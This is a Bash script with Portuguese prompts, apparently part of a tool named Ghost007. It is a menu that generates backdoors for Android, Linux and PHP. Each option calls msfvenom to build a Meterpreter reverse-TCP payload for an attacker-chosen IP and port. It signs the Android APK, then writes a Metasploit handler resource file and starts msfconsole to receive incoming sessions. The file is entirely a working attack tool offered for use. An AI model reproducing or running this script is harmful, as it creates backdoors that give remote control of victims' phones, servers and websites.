#!/bin/bash

# Cores

end="\033[m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
cyan="\033[1;36m"
white="\033[1;37m"
purple="\033[1;35m"

# Funções primarias

rm requisitos/handler.rc > /dev/null
touch requisitos/handler.rc > /dev/null

clear

printf "$red"

cat requisitos/banner.txt

printf "$end"

printf "\n"

printf "$green"

sleep 0.1
printf "{0} sair do script				{4} backdoor em php \n"
sleep 0.1
printf "{1} criar backdoor para windows \n"
sleep 0.1
printf "{2} criar backdoor para android \n"
sleep 0.1
printf "{3} criar backdoor para linux \n"
printf "\n"

read -p "Escolha uma opcão: " opcao

case "$opcao" in

	0)
		printf "tchau ( ^_^)／"
		exit 1
	;;

	1)
		echo "em desenvolvimento"
		bash back.sh
	;;

	2)

		printf "${purple}Sem .apk\n"
                read -p "Nome da backdoor: " nome2
                read -p "[?] informe o ip que ira aguardar a conexão: " lhost2
		printf "${blue}[i] lhost=$lhost2 ${end}\n"
		printf "$purple"
		read -p "[?] informe a porta que ira aguardar a conexão: " lport2
		printf "${blue}[i] lport=$lport2 ${end}\n"
                printf "${green}[*] Criando Backdoor... \n"
                msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost2 LPORT=$lport2 -o $nome2.apk
		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
		d2j-apk-sign $nome2.apk
		rm $nome2.apk
		mv $nome2-signed.apk $nome2.apk
                printf "use exploit/multi/handler \n" > requisitos/handler.rc
                printf "set payload android/meterpreter/reverse_tcp \n" >> requisitos/handler.rc
                printf "set LHOST $lhost2 \n" >> requisitos/handler.rc
                printf "set LPORT $lport2 \n" >> requisitos/handler.rc
                printf "set ExitOnSession false \n" >> requisitos/handler.rc
                printf "run -j -z" >> requisitos/handler.rc
                msfconsole -r requisitos/handler.rc
	;;

	3)

		printf "${purple}Sem .elf\n"
                read -p "Nome da backdoor: " nome3
                read -p "[?] informe o ip que ira aguardar a conexão: " lhost3
                printf "${blue}[i] lhost=$lhost3 ${end}\n"
		printf "$purple"
		read -p "[?] informe a porta que ira aguardar a conexão: " lport3
                printf "${blue}[i] lport=$lport3 ${end}\n"
                printf "${green}[*] Criando Backdoor...${end} \n"
                msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost3 LPORT=$lport3 -f elf -o $nome3.elf
		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
		chmod +x $nome3.elf
		printf "use exploit/multi/handler \n" > requisitos/handler.rc
		printf "set payload linux/x86/meterpreter/reverse_tcp \n" >> requisitos/handler.rc
                printf "set LHOST $lhost3 \n" >> requisitos/handler.rc
                printf "set LPORT $lport3 \n" >> requisitos/handler.rc
                printf "set ExitOnSession false \n" >> requisitos/handler.rc
                printf "run -j -z" >> requisitos/handler.rc
                msfconsole -r requisitos/handler.rc
	;;

	4)
		printf "${purple}Sem .php\n"
                read -p "Nome da backdoor: " nome4
                read -p "[?] informe o ip que ira aguardar a conexão: " lhost4
                printf "${blue}[i] lhost=$lhost4 ${end}\n"
		printf "$green"
                read -p "[?] informe a porta que ira aguardar a conexão: " lport4
                printf "${blue}[i] lport=$lport4 ${end}\n"
                printf "${green}[*] Criando Backdoor...${end} \n"
                msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost4 LPORT=$lport4 -o $nome4.php
		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome4.php"
		chmod +x $nome4.php
                printf "use exploit/multi/handler \n" > requisitos/handler.rc
                printf "set payload php/meterpreter/reverse_tcp \n" >> requisitos/handler.rc
                printf "set LHOST $lhost4 \n" >> requisitos/handler.rc
                printf "set LPORT $lport4 \n" >> requisitos/handler.rc
                printf "set ExitOnSession false \n" >> requisitos/handler.rc
                printf "run -j -z" >> requisitos/handler.rc
                msfconsole -r requisitos/handler.rc
	;;

	*)
		printf "${red}[!]Opção invalida${end} \n"
		sleep 1
		bash back.sh
	;;

esac
